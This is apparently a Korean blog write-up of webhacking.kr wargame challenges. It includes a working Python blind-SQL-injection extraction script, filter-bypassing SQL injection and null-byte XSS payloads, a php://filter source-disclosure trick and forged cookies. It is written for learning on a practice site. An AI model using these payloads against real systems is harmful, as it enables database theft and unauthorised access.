---
title: "[webhacking.kr] Writeup"
description: "webhacking.kr 문제 풀이 정리"
date: 2025-12-22 14:33:00 +0900
categories: [Security, Web Hacking]
tags: [wargame, writeup]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false
---

---

## old-01

```php
if(!is_numeric($_COOKIE['user_lv'])) $_COOKIE['user_lv']=1;
if($_COOKIE['user_lv']>=4) $_COOKIE['user_lv']=1;
if($_COOKIE['user_lv']>3) solve(1);
echo "<br>level : {$_COOKIE['user_lv']}";
```

처음 보안 공부를 시작하고 이 문제를 풀고 좋아했던 기억이 떠오른다..  
이때 깔았던 쿠키 수정 확장 프로그램은 아직까지 사용 중이다  

`user_lv` 쿠키값을 3.5처럼 대충 3보다 크고 4보다 작은 값으로 설정해주면 풀린다  

<br>

---

## old-02

![Image](/assets/img/251222_0/old-02.png)

IP가 로깅되고 있다는 문구와 함께 Restricted area가 뜬다  
<br>

---

```html
<!--
2025-12-23 01:15:28
-->
<h2>Restricted area</h2>Hello stranger. Your IP is logging...<!-- if you access admin.php i will kick your ass -->
```

소스를 뜯어보면 주석에 `admin.php`{: .filepath}로 이동하라고 되어 있다  
<br>

---

![Image](/assets/img/251222_0/old-02-admin.png)

`admin.php`{: .filepath}에 들어가면 패스워드를 입력하는 곳이 나온다  
아무거나 눌러보면 wrong password 문구가 나온다  
<br>

---

근데 쿠키를 보면 1766463790라는 값으로 time이라는 쿠키가 설정되어 있다  
여기서 Blind SQLi가 가능하다  
<br>

---

![Image](/assets/img/251222_0/old-02-cookie.png)

예시로 `1=1`을 입력하면 1이 반환되어 페이지의 주석에 Unix 시간으로 나오는 것을 알 수 있다  
`1=0`을 입력하면 09:00:00으로 나온다  

이걸 이용해서 Blind SQLi가 가능하다  
<br>

---

<details markdown="1">
<summary>전체 페이로드</summary>

```python
import requests

URL = "https://webhacking.kr/challenge/web-02/"

TRUE_MARK = "09:00:01"
FALSE_MARK = "09:00:00"

PHPSESSID = "{YOUR_PHPSESSID}"

def oracle(time_value: str) -> bool:
    cookies = {
        "PHPSESSID": PHPSESSID,
        "time": time_value
    }

    r = requests.get(URL, cookies=cookies, timeout=5)

    if TRUE_MARK in r.text:
        return True
    if FALSE_MARK in r.text:
        return False
    
    return RuntimeError("Unexpected response")

# # dbms dbms_length
# dbms_length = 0
# while(1):
#     payload = "(select length(database()) = "+str(dbms_length)+")"
#     if (oracle(payload)):
#         print("DBMS Length:", dbms_length)
#         break
#     dbms_length += 1 # 6

# # dbms_name
# dbms_name = ""
# for i in range(dbms_length):
#     first = 48
#     while(1):
#         payload = "(select ascii(substr(database(),"+str(i+1)+",1)) = "+str(first)+")"
#         if (oracle(payload)):
#             print("found: "+chr(first))
#             dbms_name += chr(first)
#             break
#         first += 1
# print("DBMS Name:", dbms_name) # chall2

# # table_count
# table_count = 0
# while(1):
#     payload = "((select count(table_name) from information_schema.tables where table_schema = database()) = "+str(table_count)+")"
#     if (oracle(payload)):
#         print("Table Count:", table_count)
#         break
#     table_count += 1 # 2

# # table1_length
# table1_length = 0
# while(1):
#     payload = "((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1) = "+str(table1_length)+")"
#     if (oracle(payload)):
#         print("Table1 Length:", table1_length)
#         break
#     table1_length += 1 # 13

# # table1_name
# table1_name = ""
# for i in range(table1_length):
#     first = 48
#     while(1):
#         payload = "((select ascii(substr(table_name,"+str(i+1)+",1)) from information_schema.tables where table_schema=database() limit 0,1) = "+str(first)+")"
#         if (oracle(payload)):
#             print("found: "+chr(first))
#             table1_name += chr(first)
#             break
#         first += 1
# print("Table1 Name:", table1_name) # admin_area_pw

# # table2_length
# table2_length = 0
# while(1):
#     payload = "((select length(table_name) from information_schema.tables where table_schema=database() limit 1,1) = "+str(table2_length)+")"
#     if (oracle(payload)):
#         print("Table2 Length:", table2_length)
#         break
#     table2_length += 1 # 3

# # table2_name
# table2_name = ""
# for i in range(table2_length):
#     first = 48
#     while(1):
#         payload = "((select ascii(substr(table_name,"+str(i+1)+",1)) from information_schema.tables where table_schema=database() limit 1,1) = "+str(first)+")"
#         if (oracle(payload)):
#             print("found: "+chr(first))
#             table2_name += chr(first)
#             break
#         first += 1
# print("Table2 Name:", table2_name) # log

# # column_count (table1)
# column_count = 0
# while(1):
#     payload = "((select count(column_name) from information_schema.columns where table_name=\"admin_area_pw\")="+str(column_count)+")" 
#     if (oracle(payload)):
#         print("Column Count:", column_count)
#         break
#     column_count += 1 # 1

# # column_length (table1)
# column_length = 0
# while(1):
#     payload = "((select length(column_name) from information_schema.columns where table_name=\"admin_area_pw\")="+str(column_length)+")" 
#     if (oracle(payload)):
#         print("Column Length:", column_length)
#         break
#     column_length += 1 # 2

# # column name (table1)
# column_name = ""
# for i in range(column_length):
#     first = 48
#     while(1):
#         payload = "((select ascii(substr(column_name,"+str(i+1)+",1)) from information_schema.columns where table_name=\"admin_area_pw\" limit 0,1) = "+str(first)+")"
#         if (oracle(payload)):
#             print("found: "+chr(first))
#             column_name += chr(first)
#             break
#         first += 1
# print("Column Name:", column_name) # pw

# data_length
data_length = 0
while(1):
    payload = "((select length(pw) from admin_area_pw)="+str(data_length)+")" 
    if (oracle(payload)):
        print("Data Length:", data_length)
        break
    data_length += 1 # 17

# data_value
data_value = ""
for i in range(data_length):
    first = 48
    while(1):
        payload = "((select ascii(substr(pw,"+str(i+1)+",1)) from admin_area_pw) = "+str(first)+")"
        if (oracle(payload)):
            print("found: "+chr(first))
            data_value += chr(first)
            break
        first += 1
print("Data Value:", data_value)
```

필요한 부분만 주석 해제하고 사용하면 된다  
사실 마지막 두 개만 있어도 풀리지만 연습 겸 다 써봤다  
</details>

처음 이 문제를 2번이라는 이유로 1번 풀고 시도했던 문제인데 인터넷 뒤적여가면서 풀었던 게 생각난다  
당시에는 파이썬에 능숙하지도 않아서 일일히 손으로 쿠키 수정해가며 했는데 이번에 페이로드를 제대로 써본다  
<br>

---

## old-03

![Image](/assets/img/251222_0/old-03.png)

간단한 노노그램 문제다 저렇게 클릭해놓고 solved를 눌러본다  
<br>

---

![Image](/assets/img/251222_0/old-03-log.png)

이렇게 log에 쓸 이름을 입력하는 폼이 나온다  
<br>

---

```html
<html>
<head>
<title>Challenge 3</title>
</head>
<body>
<center>Nonogram</center>
<p>
<hr>

<form name=kk method=get action=index.php>

</form><form method=post action=index.php><input type=hidden name=answer value=1010100000011100101011111>Clear!<br>enter your name for log : <input type=text name=id maxlength=10 size=10><input type=submit value='submit'>
```

hidden으로 숨겨진 input이 하나 더 있다  
여기에 select를 입력하니까 No hack이 뜨는 걸로 봐서 여기서 SQLi를 하는 문제인 것 같다  

그냥 `1' or 1=1 -- ` 주고 send하니까 풀렸다..
<br>

---

## old-05

```javascript
function no()
{
alert('Access_Denied');
}

function move(page)
{
if(page=='login') { location.href='mem/login.php'; }

}
```

Join을 누르면 Access_Denied가 뜨는데 Login을 누르면 `/mem/login.php`{: .filepath}로 이동하게 된다  

그렇다면 `/mem/join.php`{: .filepath}로도 이동할 수 있지 않을까  
<br>

---

```javascript
l = 'a';
ll = 'b';
lll = 'c';
llll = 'd';
lllll = 'e';
llllll = 'f';
lllllll = 'g';
llllllll = 'h';
lllllllll = 'i';
llllllllll = 'j';
lllllllllll = 'k';
llllllllllll = 'l';
lllllllllllll = 'm';
llllllllllllll = 'n';
lllllllllllllll = 'o';
llllllllllllllll = 'p';
lllllllllllllllll = 'q';
llllllllllllllllll = 'r';
lllllllllllllllllll = 's';
llllllllllllllllllll = 't';
lllllllllllllllllllll = 'u';
llllllllllllllllllllll = 'v';
lllllllllllllllllllllll = 'w';
llllllllllllllllllllllll = 'x';
lllllllllllllllllllllllll = 'y';
llllllllllllllllllllllllll = 'z';
I = '1';
II = '2';
III = '3';
IIII = '4';
IIIII = '5';
IIIIII = '6';
IIIIIII = '7';
IIIIIIII = '8';
IIIIIIIII = '9';
IIIIIIIIII = '0';
li = '.';
ii = '<';
iii = '>';
lIllIllIllIllIllIllIllIllIllIl = lllllllllllllll + llllllllllll + llll + llllllllllllllllllllllllll + lllllllllllllll + lllllllllllll + ll + lllllllll + lllll;
lIIIIIIIIIIIIIIIIIIl = llll + lllllllllllllll + lll + lllllllllllllllllllll + lllllllllllll + lllll + llllllllllllll + llllllllllllllllllll + li + lll + lllllllllllllll + lllllllllllllll + lllllllllll + lllllllll + lllll;
if (eval(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl) == -1) {
    alert('bye');
    throw "stop";
}
if (eval(llll + lllllllllllllll + lll + lllllllllllllllllllll + lllllllllllll + lllll + llllllllllllll + llllllllllllllllllll + li + 'U' + 'R' + 'L').indexOf(lllllllllllll + lllllllllllllll + llll + lllll + '=' + I) == -1) {
    alert('access_denied');
    throw "stop";
} else {
    document.write('<font size=2 color=white>Join</font><p>');
    document.write('.<p>.<p>.<p>.<p>.<p>');
    document.write('<form method=post action=' + llllllllll + lllllllllllllll + lllllllll + llllllllllllll + li + llllllllllllllll + llllllll + llllllllllllllll + '>');
    document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name=' + lllllllll + llll + ' maxlength=20></td></tr>');
    document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name=' + llllllllllllllll + lllllllllllllllllllllll + '></td></tr>');
    document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');
}
```

Bye 문구가 alert로 나오지만 소스를 보면 스크립트가 삽입되어 있다  
<br>

---

```javascript
l = 'a';
ll = 'b';
chr_c = 'c';
chr_d = 'd';
chr_e = 'e';
chr_f = 'f';
chr_g = 'g';
chr_h = 'h';
chr_i = 'i';
chr_j = 'j';
chr_k = 'k';
chr_l = 'l';
chr_m = 'm';
chr_n = 'n';
chr_o = 'o';
chr_p = 'p';
chr_q = 'q';
chr_r = 'r';
chr_s = 's';
chr_t = 't';
chr_u = 'u';
chr_v = 'v';
chr_w = 'w';
chr_x = 'x';
chr_y = 'y';
chr_z = 'z';
I = '1';
II = '2';
III = '3';
IIII = '4';
IIIII = '5';
IIIIII = '6';
num_7 = '7';
num_8 = '8';
num_9 = '9';
num_0 = '0';
dot = '.';
ii = '<';
iii = '>';
string1 = chr_o + chr_l + chr_d + chr_z + chr_o + chr_m + ll + chr_i + chr_e; // oldzombie
string2 = chr_d + chr_o + chr_c + chr_u + chr_m + chr_e + chr_n + chr_t + dot + chr_c + chr_o + chr_o + chr_k + chr_i + chr_e; // document.cookie
if (eval(string2).indexOf(string1) == -1) {
    alert('bye');
    throw "stop";
}
// document.URL  // mode=1
if (eval(chr_d + chr_o + chr_c + chr_u + chr_m + chr_e + chr_n + chr_t + dot + 'U' + 'R' + 'L').indexOf(chr_m + chr_o + chr_d + chr_e + '=' + I) == -1) {
    alert('access_denied');
    throw "stop";
} else {
    document.write('<font size=2 color=white>Join</font><p>');
    document.write('.<p>.<p>.<p>.<p>.<p>');
    document.write('<form method=post action=' + chr_j + chr_o + chr_i + chr_n + dot + chr_p + chr_h + chr_p + '>'); // join.php>
    document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name=' + chr_i + chr_d + ' maxlength=20></td></tr>'); // id
    document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name=' + chr_p + chr_w + '></td></tr>'); // pw
    document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');
}
```

난독화를 풀어보면 대충 다음과 같다  

쿠키값에 `oldzombie`가 있고 URL에 `mode=1`을 넣으라니까 파라미터에 넣으면 되겠다  
<br>

---

![Image](/assets/img/251222_0/old-05-join.png)

그러면 Join 회원가입을 할 수 있는 페이지가 나온다  

여기서 회원가입 아무거나 하고 로그인을 해보았으나.. admin으로 로그인해야 한다고 한다  
근데 또 Join에서 ID에 admin을 넣으면 이미 있는 ID라고 회원가입이 되지 않는다..  
<br>

---

여기서 ID에 html 태그를 넣으니까 XSS가 되길래 이걸로 하는 건가 싶어서 삽질했는데 그냥 admin 앞에 공백을 넣어서 회원가입하면 된다..  
<br>

---

## old-06

```php
<?php
$decode_id=$_COOKIE['user'];
$decode_pw=$_COOKIE['password'];

$decode_id=str_replace("!","1",$decode_id);
$decode_id=str_replace("@","2",$decode_id);
$decode_id=str_replace("$","3",$decode_id);
$decode_id=str_replace("^","4",$decode_id);
$decode_id=str_replace("&","5",$decode_id);
$decode_id=str_replace("*","6",$decode_id);
$decode_id=str_replace("(","7",$decode_id);
$decode_id=str_replace(")","8",$decode_id);

$decode_pw=str_replace("!","1",$decode_pw);
$decode_pw=str_replace("@","2",$decode_pw);
$decode_pw=str_replace("$","3",$decode_pw);
$decode_pw=str_replace("^","4",$decode_pw);
$decode_pw=str_replace("&","5",$decode_pw);
$decode_pw=str_replace("*","6",$decode_pw);
$decode_pw=str_replace("(","7",$decode_pw);
$decode_pw=str_replace(")","8",$decode_pw);

for($i=0;$i<20;$i++){
  $decode_id=base64_decode($decode_id);
  $decode_pw=base64_decode($decode_pw);
}

echo("<hr><a href=./?view_source=1 style=color:yellow;>view-source</a><br><br>");
echo("ID : $decode_id<br>PW : $decode_pw<hr>");

if($decode_id=="admin" && $decode_pw=="nimda"){
  solve(6);
}
?>
```

`username`과 `password`가 쿠키에 있는데 코드에 적힌대로 일부 문자들을 replace하고 Base64로 20번 디코딩했을 때 `username`은 `admin`, `password`는 `nimda`로 각각 나와야 한다   

역으로 `username`과 `password`를 구한다면 우선 `admin`과 `nimda`를 Base64로 20번 인코딩하고 replace를 반대로 하면 된다  
<br>

---

```python
import base64

map_table = {
    '1': '!', '2': '@', '3': '$', '4': '^',
    '5': '&', '6': '*', '7': '(', '8': ')'
}

def encode_cookie(val):
    for _ in range(20):
        val = base64.b64encode(val.encode()).decode()

    for k, v in map_table.items():
        val = val.replace(k, v)

    return val


user_cookie = encode_cookie("admin")
pw_cookie   = encode_cookie("nimda")

print("user =", user_cookie)
print("password =", pw_cookie)
```

<br>

---

## old-10

```html
<a id="hackme" style="position:relative;left:0;top:0" onclick="this.style.left=parseInt(this.style.left,10)+1+'px';if(this.style.left=='1600px')this.href='?go='+this.style.left" onmouseover="this.innerHTML='yOu'" onmouseout="this.innerHTML='O'">O</a>
```

a 태그가 들어있다  
클릭할 때마다 `left`가 1씩 증가하니 1600으로 될 때까지 해보면 될 것 같다  
<br>

---

바로 `?go=1600px`{: .filepath}로 가봤는데 no hack이 뜬다.. 뭐 어쩌라는거;;  
<br>

---

```javascript
for (let x=0; x<1599; x++) document.getElementById('hackme').click();
```

이렇게 해놓고 한 번 클릭하면 풀린다  
<br>

---

## old-11

```php
$pat="/[1-3][a-f]{5}_.*$_SERVER[REMOTE_ADDR].*\tp\ta\ts\ts/";
if(preg_match($pat,$_GET['val'])){
  solve(11);
}
else echo("<h2>Wrong</h2>");
echo("<br><br>");
```

정규식 맞춰서 `?val=` 파라미터에 넣어서 전송해주면 된다  
Tab 문자는 `%09`로 나타내면 된다  
<br>

---

## old-12

![Image](/assets/img/251222_0/old-12-js.png)

난독화된 JS 코드가 들어있는데 너무 길어서 붙여넣을 수가 없다..  
<br>

---

근데 요즘엔 AI가 발전해가 이 정도 난독화는 쉽게 해독할 수 있다  

인 줄 알았는데 aaencode 방식으로 난독화된 JS 코드였다  
세상에는 정말 많은 인코딩 방식이 있었다..  
<br>

---

```javascript
var enco='';
var enco2=126;
var enco3=33;
var ck=document.URL.substr(document.URL.indexOf('='));
for(i=1;i<122;i++){
  enco=enco+String.fromCharCode(i,0);
}
function enco_(x){
  return enco.charCodeAt(x);
}
if(ck=="="+String.fromCharCode(enco_(240))+String.fromCharCode(enco_(220))+String.fromCharCode(enco_(232))+String.fromCharCode(enco_(192))+String.fromCharCode(enco_(226))+String.fromCharCode(enco_(200))+String.fromCharCode(enco_(204))+String.fromCharCode(enco_(222-2))+String.fromCharCode(enco_(198))+"~~~~~~"+String.fromCharCode(enco2)+String.fromCharCode(enco3)){
  location.href="./"+ck.replace("=","")+".php";
}
```

aadecode로 난독화를 해제해보면 위와 같은 코드가 나온다  

조건문을 보면 `ck`가 `=youaregod~~~~~~~!`와 같으면 `ck`.php로 이동하게 된다  
이때 `=`를 지우므로 `./youaregod~~~~~~~!.php`{: .filepath}로 이동하면 풀린다  
<br>

---

## old-14

```javascript
function ck(){
  var ul=document.URL;
  ul=ul.indexOf(".kr");
  ul=ul*30;
  if(ul==pw.input_pwd.value) { location.href="?"+ul*pw.input_pwd.value; }
  else { alert("Wrong"); }
  return false;
}
```

입력 폼이 있고 소스 코드에 스크립트가 삽입되어 있다  
<br>

---

![Image](/assets/img/251222_0/old-14-console.png)

콘솔에서 쉽게 값을 구해낼 수 있다  
540이 `pw.input_pwd.value`와 같아야 하므로 540을 입력한다  
<br>

---

## old-15

![Image](/assets/img/251222_0/old-15-curl.png)

그냥 접속하면 Access_Denied 문구와 함께 alert가 뜨며 들어가지지 않는다  

curl로 확인해보면 애초부터 스크립트가 그리 짜여져 있는데 &lt;a&gt; 태그로 `?getFlag`{: .filepath}로 가라고 한다  
해당 링크로 가면 플래그를 얻을 수 있다  
<br>

---

## old-16

```javascript
document.body.innerHTML+="<font color=yellow id=aa style=position:relative;left:0;top:0>*</font>";
function mv(cd){
  kk(star.style.left-50,star.style.top-50);
  if(cd==100) star.style.left=parseInt(star.style.left+0,10)+50+"px";
  if(cd==97) star.style.left=parseInt(star.style.left+0,10)-50+"px";
  if(cd==119) star.style.top=parseInt(star.style.top+0,10)-50+"px";
  if(cd==115) star.style.top=parseInt(star.style.top+0,10)+50+"px";
  if(cd==124) location.href=String.fromCharCode(cd)+".php"; // do it!
}
function kk(x,y){
  rndc=Math.floor(Math.random()*9000000);
  document.body.innerHTML+="<font color=#"+rndc+" id=aa style=position:relative;left:"+x+";top:"+y+" onmouseover=this.innerHTML=''>*</font>";
}
```

100, 97, 119, 115는 각각 d, a, w, s로 wasd로 무언가를 조작할 수 있는 듯하다  

124는 `|`이다  
근데 주석에 그걸 해보라 하니까 눌러봤더니 걍 풀린다..  

딱히 writeup으로 쓸 가치는 없는 것 같지만 일단 써본다..  
사실 해킹 공부를 시작한 지 얼마 되지 않았을 때 webhacking.kr을 하면서 이 문제를 푸는데 꽤 오래 걸렸다..ㅋㅋ
<br>

---

## old-17

```javascript
unlock = 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 1 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 + 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 - 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 / 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 * 100 * 10 * 10 + 100 / 10 - 10 + 10 + 50 - 9 * 8 + 7 - 6 + 5 - 4 * 3 - 2 * 1 * 10 + 9999999;
function sub() {
    if (login.pw.value == unlock) {
        location.href = "?" + unlock / 10;
    } else {
        alert("Wrong");
    }
}
```

![Image](/assets/img/251222_0/old-17-cal.png)

그냥 콘솔에 붙여넣기 해서 답 구하면 되는 간단한 문제다  
<br>

---

## old-18

```php
if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/ |\/|\(|\)|\||&|select|from|0x/i",$_GET['no'])) exit("no hack");
  $result = mysqli_fetch_array(mysqli_query($db,"select id from chall18 where id='guest' and no=$_GET[no]")); // admin's no = 2

  if($result['id']=="guest") echo "hi guest";
  if($result['id']=="admin"){
    solve(18);
    echo "hi admin!";
  }
}
```

간단한 SQLi류 문제다   
정규식으로 공백 문자가 필터링되어 있는데 간단하게 탭 문자로 우회해주면 된다   

`0%09or%09no=2` -> ` or no=2`  
<br>

---

## old-19

![Image](/assets/img/251222_0/old-19-guest.png)

admin으로 로그인이 안 되니 guest로 로그인해봤더니 된다  
<br>

---

로그아웃이 안 되길래 보니까 userid라는 쿠키값이 생겼다  
`YjJmNWZmNDc0MzY2NzFiNmU1MzNkOGRjMzYxNDg0NWQ3Yjc3NGVmZmU0YTM0OWM2ZGQ4MmFkNGY0ZjIxZDM0Y2UxNjcxNzk3YzUyZTE1Zjc2MzM4MGI0NWU4NDFlYzMyMDNjN2MwYWNlMzk1ZDgwMTgyZGIwN2FlMmMzMGYwMzRlMzU4ZWZhNDg5ZjU4MDYyZjEwZGQ3MzE2YjY1NjQ5ZQ%3D%3D`인데 뒤에 `%3D`가 붙어있다  
등호(`=`)인데 두 개가 붙어있으니 Base64일 것 같다  
<br>

---

`b2f5ff47436671b6e533d8dc3614845d7b774effe4a349c6dd82ad4f4f21d34ce1671797c52e15f763380b45e841ec3203c7c0ace395d80182db07ae2c30f034e358efa489f58062f10dd7316b65649e`  

이런 문자열이 나오는데 헥스값들인 것 같다  
근데 변환해봐야 아무것도 안 나오니 무언가의 해시인 듯하다  
<br>

---

![Image](/assets/img/251222_0/old-19-crack.png)

해시 크랙 사이트에서 보니까 `g`라는 문자의 md5 해시값이라고 한다..  
근데 말이 안 되는게 md5 해시라기엔 너무 길다..  

근데 `g` 문자를 md5를 해보면 `b2f5ff47436671b6e533d8dc3614845d`이다  
앞부분과 동일한데 `guest`라는 문자열의 한 글자 한 글자를 md5로 해시하고 붙인 결과였다  
<br>

---

```
0cc175b9c0f1b6a831c399e269772661
8277e0910d750195b448797616e091ad
6f8f57715090da2632453988d9a1501b
865c0c0b4ab0e063e5caa3387c1a8741
7b8b965ad4bca0e41ab51de7b31363a1

MGNjMTc1YjljMGYxYjZhODMxYzM5OWUyNjk3NzI2NjE4Mjc3ZTA5MTBkNzUwMTk1YjQ0ODc5NzYxNmUwOTFhZDZmOGY1NzcxNTA5MGRhMjYzMjQ1Mzk4OGQ5YTE1MDFiODY1YzBjMGI0YWIwZTA2M2U1Y2FhMzM4N2MxYTg3NDE3YjhiOTY1YWQ0YmNhMGU0MWFiNTFkZTdiMzEzNjNhMQ==

MGNjMTc1YjljMGYxYjZhODMxYzM5OWUyNjk3NzI2NjE4Mjc3ZTA5MTBkNzUwMTk1YjQ0ODc5NzYxNmUwOTFhZDZmOGY1NzcxNTA5MGRhMjYzMjQ1Mzk4OGQ5YTE1MDFiODY1YzBjMGI0YWIwZTA2M2U1Y2FhMzM4N2MxYTg3NDE3YjhiOTY1YWQ0YmNhMGU0MWFiNTFkZTdiMzEzNjNhMQ%3D%3D
```

그러면 admin도 똑같은 방식으로 만들어주고 쿠키에 적용해주면 풀린다  
<br>

---

## old-20
2초 이내에 Captcha까지 맞춰서 요청을 보내면 된다  

근데 2초 만에 다 치기에는 어려운데 쿠키값을 보면 현재 시간이 Unix Timestamp 형태로 저장되어 있다  
쿠키값을 조작해서 시간을 맞추고 그 시간에 맞춰서 요청을 보내면 풀린다  
<br>

---

## old-23

![Image](/assets/img/251222_0/old-23.png)

XSS로 스크립트 태그를 인젝션 해야 한다  
<br>

---

특수 문자와 숫자 문자는 상관이 없지만 그 외의 문자가 연속으로 올 경우 no hack을 출력하게 된다..  
<br>

---

`%3Cs%00c%00r%00i%00p%00t%3Ea%00l%00e%00r%00t(1);%3C/s%00c%00r%00i%00p%00t%3E`  

`%00` 문자를 두 문자 사이에 두면 우회할 수 있다  
<br>

---

## old-24

```php
extract($_SERVER);
extract($_COOKIE);
$ip = $REMOTE_ADDR;
$agent = $HTTP_USER_AGENT;
if($REMOTE_ADDR){
$ip = htmlspecialchars($REMOTE_ADDR);
$ip = str_replace("..",".",$ip);
$ip = str_replace("12","",$ip);
$ip = str_replace("7.","",$ip);
$ip = str_replace("0.","",$ip);
}
if($HTTP_USER_AGENT){
$agent=htmlspecialchars($HTTP_USER_AGENT);
}
echo "<table border=1><tr><td>client ip</td><td>{$ip}</td></tr><tr><td>agent</td><td>{$agent}</td></tr></table>";
if($ip=="127.0.0.1"){
solve(24);
exit();
}
else{
echo "<hr><center>Wrong IP!</center>";
}
```

아이피가 127.0.0.1로 나오면 되는데 필터링이 몇 개 되어 있어서 그것만 좀 맞춰주면 된다  

좀 헷갈리는데 `112277....00....00....1`로 하면 된다  

`user-agent`는 딱히 신경 쓸 필요 없다  
<br>

---

처음에는 Burp Suite로 X-Forwarded-For로 조작하는 건 줄 알았는데 아니었다  
쿠키로 `REMOTE_ADDR`을 만들고 값을 `112277....00....00....1`로 저장하면 풀린다   
<br>

---

이는 PHP에서 `extract()`를 하게 되면 인자로 들어간 배열의 키가 변수명으로 바뀌기 때문이다  

`extract($_COOKIE);`를 하게 되면 내부적으로 `$REMOTE_ADDR = $_COOKIE['REMOTE_ADDR'];`와 같은 동작을 하게 되는 것이다  
<br>

---

## old-25

![Image](/assets/img/251222_0/old-25.png)

`?file=` 파라미터에 flag를 주면 flag.php가 실행된 결과가 나온다  
FLAG는 코드에 있다고 하는데 flag.php 실행 결과가 아닌 flag.php 자체의 코드를 읽어야 하는 것 같다  
<br>

---

`php://filter/convert.base64-encode/resource=flag`  

지피티랑 하다가 이렇게 풀었다  
php의 wrapper를 사용한 것인데 `flag`의 내용을 base64로 인코딩하여 출력하게 된다  

후에 디코딩해보면 플래그를 확인할 수 있다  
<br>

---

## old-26

```php
<?php
  if(preg_match("/admin/",$_GET['id'])) { echo"no!"; exit(); }
  $_GET['id'] = urldecode($_GET['id']);
  if($_GET['id'] == "admin"){
    solve(26);
  }
?>
```

`id` 파리미터가 그냥 'admin'이면 안 되고 `urldecode()`를 했을 때 'admin'이 되면 풀린다  

`admin`을 인코딩해서 `%61%64%6d%69%6e`을 보냈더니 no!가 뜬다..  
그러니 `%61%64%6d%69%6e`을 한 번 더 인코딩해서 `%2561%2564%256d%2569%256e`을 보내면 풀린다  
<br>

---

## old-27

```php
if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
  if($r['id']=="guest") echo("guest");
  if($r['id']=="admin") solve(27); // admin's no = 2
}
```

간단한 SQLi 문제다  
select, limit, &#40;, =, 0x, 공백 문자가 필터링된다  

보면 `no=(` 뒤에 괄호가 닫혀 있는데 닫는 괄호는 필터링되지 않아서 사용할 수 있다  
<br>

---

`2)%09or%09no%09like%092%09--%09`

이번에도 공백 문자는 탭 문자로 우회해준다  
괄호가 열려 있으니 닫고, 뒤에 붙는 괄호는 무시하도록 주석 처리까지 해주면 된다  
<br>

---

## old-32

랭킹 시스템처럼 생긴게 주어진다  
명단 중 하나를 클릭하면 옆에 Hit 수치가 올라간다  

한 번 클릭하면 또 클릭이 불가능한데 내 이름 옆에 Hit을 100번 눌러줘야 한다..  
쿠키값을 보면 `vote_check`라는 이름을 가진 값이 있다  

해당 쿠키값 자체를 삭제하고 나면 한 번 더 Hit가 가능하다  
이렇게 100번을 하면 되는데 손으로 하면 힘들고 귀찮으니 Burp Suite를 쓰자  
<br>

---

